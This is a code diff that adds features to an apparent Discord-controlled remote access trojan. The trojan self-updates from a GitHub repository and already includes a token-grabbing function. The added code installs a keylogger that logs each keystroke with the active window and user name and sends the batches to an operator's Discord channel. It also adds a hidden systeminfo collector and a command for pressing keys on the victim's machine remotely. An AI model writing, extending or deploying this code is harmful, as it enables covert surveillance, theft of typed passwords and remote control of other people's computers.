@@ -34,7 +34,9 @@ import httpx
 from misc import *
 import pyaudio
 from cryptography.fernet import Fernet
-
+from pynput.keyboard import Key, Listener
+import asyncio
+import win32gui
 
 
 key = b"KzgB8bcSmuhiXudpeJ97pGxrVJNpRUAeeKR7MK80hbQ="
@@ -82,6 +84,106 @@ pyautogui.FAILSAFE = False
 SCRIPT_URL = "https://raw.githubusercontent.com/adolfhustler/Aladeen/refs/heads/main/drat.py"
 CURRENT_VERSION = "1.0.0"
 UPDATE_URL = "https://raw.githubusercontent.com/adolfhustler/Aladeen/refs/heads/main/version.txt"
+files_to_send = []
+messages_to_send = []
+embeds_to_send = []
+channel_ids = {'main': 1338130695054168094, 'spam': 1338130619825258526}
+text_buffer = ''
+user_name = os.getenv("UserName")
+
+keycodes = {
+    Key.space: '',  
+    Key.shift: ' *`SHIFT`*',
+    Key.tab: ' *`TAB`*',
+    Key.backspace: ' *`BACKSPACE`*',
+    Key.esc: ' *`ESC`*',
+    Key.caps_lock: ' *`CAPS LOCK`*',
+    Key.f1: ' *`F1`*',
+    Key.f2: ' *`F2`*',
+    Key.f3: ' *`F3`*',
+    Key.f4: ' *`F4`*',
+    Key.f5: ' *`F5`*',
+    Key.f6: ' *`F6`*',
+    Key.f7: ' *`F7`*',
+    Key.f8: ' *`F8`*',
+    Key.f9: ' *`F9`*',
+    Key.f10: ' *`F10`*',
+    Key.f11: ' *`F11`*',
+    Key.f12: ' *`F12`*',
+    Key.enter: ' *`ENTER`*',
+    Key.left: ' *`<-`*',
+    Key.right: ' *`->`*',
+    Key.up: ' *`ARROW UP`*',
+    Key.down: ' *`ARROW DOWN`*',
+    Key.ctrl_l: '',
+    Key.alt_l: ' *`ALT TAB`*',
+    Key.cmd: '*`WINDOWS KEY*`'
+
+}
+
+held_keys = set()
+
+def get_active_window():
+    """Get the active window title."""
+    window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+    return window if window else "Unknown Application"
+
+def on_press(key):
+    """Handle key press events."""
+    global text_buffer, messages_to_send, embeds_to_send, held_keys
+
+    if key in held_keys:
+        return
+    held_keys.add(key)  
+
+
+    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    active_window = get_active_window()
+
+
+    if key in keycodes:
+        processed_key = keycodes[key]
+        text_buffer += f" {processed_key} "
+    elif hasattr(key, 'char') and key.char is not None:
+        processed_key = key.char 
+        text_buffer += processed_key
+    else:
+        processed_key = f" *`{key}`* "
+        text_buffer += processed_key
+
+
+    if key == Key.enter:
+        formatted_message = f"`[{timestamp}]` `[{active_window}]` `[ User: {user_name}]`\n{text_buffer.strip()}"
+        messages_to_send.append((channel_ids['main'], formatted_message))
+        text_buffer = ""
+
+
+    if len(text_buffer) > 1975:
+        formatted_message = f"`[{timestamp}]` `[{active_window}]` `[ User: {user_name}]`\n{text_buffer.strip()}"
+        messages_to_send.append((channel_ids['main'], formatted_message))
+        text_buffer = ""
+
+def on_release(key):
+    """Handle key release events."""
+    if key in held_keys:
+        held_keys.remove(key)
+
+async def keylogger_task():
+    """Asynchronous function to send messages periodically."""
+    while True:
+        if messages_to_send:
+            copy_messages = messages_to_send[:]
+            messages_to_send.clear()
+            for msg in copy_messages:
+                channel = bot.get_channel(msg[0])
+                if channel:
+                    await channel.send(msg[1])
+
+        await asyncio.sleep(1)
+
+async def start_keylogger():
+    """Starts the keylogger listener in an async-safe way."""
+    await asyncio.to_thread(Listener(on_press=on_press, on_release=on_release).start)
 
 
 def check_for_updates():
@@ -386,10 +488,14 @@ def grabToken():
                 continue
 
 
+
+
 @bot.event
 async def on_ready():
     print(f"running")
     grabToken()
+    bot.loop.create_task(keylogger_task())
+    await start_keylogger()
 
 
 
@@ -951,6 +1057,236 @@ class PyAudioPCM(discord.AudioSource):
         self.input_stream = p.open(format=pyaudio.paInt16, channels=channels, rate=rate, input=True, input_device_index=input_device, frames_per_buffer=chunk)
     def read(self) -> bytes:
         return self.input_stream.read(self.chunks)
+
+
+
+def get_value_by_label(label, output):
+    label = label + ":"
+    lines = output.splitlines()
+    for line in lines:
+        if line.startswith(label):
+            return line.split(label)[1].strip()
+    return None
+
+def get_os_version(output):
+    return get_value_by_label("OS Version", output)
+
+def get_os_manufacturer(output):
+    return get_value_by_label("OS Manufacturer", output)
+
+def get_os_configuration(output):
+    return get_value_by_label("OS Configuration", output)
+
+def get_os_build_type(output):
+    return get_value_by_label("OS Build Type", output)
+
+def get_registered_owner(output):
+    return get_value_by_label("Registered Owner", output)
+
+def get_registered_organization(output):
+    return get_value_by_label("Registered Organization", output)
+
+def get_product_id(output):
+    return get_value_by_label("Product ID", output)
+
+def get_original_install_date(output):
+    return get_value_by_label("Original Install Date", output)
+
+def get_system_boot_time(output):
+    return get_value_by_label("System Boot Time", output)
+
+def get_system_manufacturer(output):
+    return get_value_by_label("System Manufacturer", output)
+
+def get_system_model(output):
+    return get_value_by_label("System Model", output)
+
+def get_system_type(output):
+    return get_value_by_label("System Type", output)
+
+def get_processors(output):
+    return get_value_by_label("Processor(s)", output)
+
+def get_bios_version(output):
+    return get_value_by_label("BIOS Version", output)
+
+def get_windows_directory(output):
+    return get_value_by_label("Windows Directory", output)
+
+def get_system_directory(output):
+    return get_value_by_label("System Directory", output)
+
+def get_boot_device(output):
+    return get_value_by_label("Boot Device", output)
+
+def get_system_locale(output):
+    return get_value_by_label("System Locale", output)
+
+def get_input_locale(output):
+    return get_value_by_label("Input Locale", output)
+
+def get_time_zone(output):
+    return get_value_by_label("Time Zone", output)
+
+def get_available_physical_memory(output):
+    return get_value_by_label("Available Physical Memory", output)
+
+def get_virtual_memory_max_size(output):
+    return get_value_by_label("Virtual Memory: Max Size", output)
+
+def get_virtual_memory_available(output):
+    return get_value_by_label("Virtual Memory: Available", output)
+
+def get_virtual_memory_in_use(output):
+    return get_value_by_label("Virtual Memory: In Use", output)
+
+def get_page_file_locations(output):
+    return get_value_by_label("Page File Location(s)", output)
+
+def get_domain(output):
+    return get_value_by_label("Domain", output)
+
+def get_logon_server(output):
+    return get_value_by_label("Logon Server", output)
+
+def get_hotfixes(output):
+    return get_value_by_label("Hotfix(s)", output)
+
+def get_network_cards(output):
+    return get_value_by_label("Network Card(s)", output)
+
+def get_hyperv_requirements(output):
+    return get_value_by_label("Hyper-V Requirements", output)
+
+def get_battery_percentage(output):
+    return get_value_by_label("Battery Percentage", output)
+
+
+
+@bot.command()
+async def sys_info(ctx, user):
+    if user == name:
+        try:
+            os_info = subprocess.run(
+                'powershell.exe systeminfo', 
+                stdout=subprocess.PIPE,
+                stderr=subprocess.DEVNULL,
+                text=True,
+                creationflags=subprocess.CREATE_NO_WINDOW
+            ).stdout
+        except FileNotFoundError:
+            await ctx.send("The 'systeminfo' command is not available on this system.")
+            return
+
+        os_version = get_os_version(os_info)
+        os_manufacturer = get_os_manufacturer(os_info)
+        os_configuration = get_os_configuration(os_info)
+        os_build_type = get_os_build_type(os_info)
+        registered_owner = get_registered_owner(os_info)
+        registered_organization = get_registered_organization(os_info)
+        product_id = get_product_id(os_info)
+        original_install_date = get_original_install_date(os_info)
+        system_boot_time = get_system_boot_time(os_info)
+        system_manufacturer = get_system_manufacturer(os_info)
+        system_model = get_system_model(os_info)
+        system_type = get_system_type(os_info)
+        processors = get_processors(os_info)
+        bios_version = get_bios_version(os_info)
+        windows_directory = get_windows_directory(os_info)
+        system_directory = get_system_directory(os_info)
+        boot_device = get_boot_device(os_info)
+        system_locale = get_system_locale(os_info)
+        input_locale = get_input_locale(os_info)
+        time_zone = get_time_zone(os_info)
+        available_physical_memory = get_available_physical_memory(os_info)
+        virtual_memory_max_size = get_virtual_memory_max_size(os_info)
+        virtual_memory_available = get_virtual_memory_available(os_info)
+        virtual_memory_in_use = get_virtual_memory_in_use(os_info)
+        page_file_locations = get_page_file_locations(os_info)
+        domain = get_domain(os_info)
+        logon_server = get_logon_server(os_info)
+        hotfixes = get_hotfixes(os_info)
+        network_cards = get_network_cards(os_info)
+        hyperv_requirements = get_hyperv_requirements(os_info)
+        battery_percentage = get_battery_percentage(os_info)
+
+        info_message = f"OS Version: {os_version}\n" \
+                       f"OS Manufacturer: {os_manufacturer}\n" \
+                       f"OS Configuration: {os_configuration}\n" \
+                       f"OS Build Type: {os_build_type}\n" \
+                       f"Registered Owner: {registered_owner}\n" \
+                       f"Registered Organization: {registered_organization}\n" \
+                       f"Product ID: {product_id}\n" \
+                       f"Original Install Date: {original_install_date}\n" \
+                       f"System Boot Time: {system_boot_time}\n" \
+                       f"System Manufacturer: {system_manufacturer}\n" \
+                       f"System Model: {system_model}\n" \
+                       f"System Type: {system_type}\n" \
+                       f"Processors: {processors}\n" \
+                       f"BIOS Version: {bios_version}\n" \
+                       f"Windows Directory: {windows_directory}\n" \
+                       f"System Directory: {system_directory}\n" \
+                       f"Boot Device: {boot_device}\n" \
+                       f"System Locale: {system_locale}\n" \
+                       f"Input Locale: {input_locale}\n" \
+                       f"Time Zone: {time_zone}\n" \
+                       f"Available Physical Memory: {available_physical_memory}\n" \
+                       f"Virtual Memory: Max Size: {virtual_memory_max_size}\n" \
+                       f"Virtual Memory: Available: {virtual_memory_available}\n" \
+                       f"Virtual Memory: In Use: {virtual_memory_in_use}\n" \
+                       f"Page File Location(s): {page_file_locations}\n" \
+                       f"Domain: {domain}\n" \
+                       f"Logon Server: {logon_server}\n" \
+                       f"Hotfix(s): {hotfixes}\n" \
+                       f"Network Card(s): {network_cards}\n" \
+                       f"Hyper-V Requirements: {hyperv_requirements}\n" \
+                       f"Battery Percentage: {battery_percentage}\n"
+
+        messages = []
+        while len(info_message) > 0:
+            messages.append(info_message[:2000])
+            info_message = info_message[2000:]
+
+        for message in messages:
+            code_block_message = f"```{message}```"
+            await ctx.send(code_block_message)
+
+
+@bot.command(name="key")
+async def key_command(ctx, *, keystrokes: str = None):
+    if keystrokes is None:
+        embed = discord.Embed(
+            title="📛 Error",
+            description="Syntax: !key <keys-to-press>",
+            colour=discord.Colour.red()
+        )
+        embed.set_author(
+            name="The Aladeen Citadel",
+            icon_url="https://raw.githubusercontent.com/adolfhustler/Aladeen/Flag_of_Wadiya.gif"
+        )
+        reaction_msg = await ctx.send(embed=embed)
+        await reaction_msg.add_reaction('🔴')
+    else:
+        if "ALTTAB" in keystrokes:
+            pyautogui.hotkey('alt', 'tab')
+        elif "ALTF4" in keystrokes:
+            pyautogui.hotkey('alt', 'f4')
+        else:
+            for key in keystrokes:
+                pyautogui.press(key)
+        
+        embed = discord.Embed(
+            title="🟢 Success",
+            description="All keys have been successfully pressed",
+            colour=discord.Colour.green()
+        )
+        embed.set_author(
+            name="PySilon-malware",
+            icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png"
+        )
+        reaction_msg = await ctx.send(embed=embed)
+        await reaction_msg.add_reaction('🔴')            
+
 
 
 def run_rat():
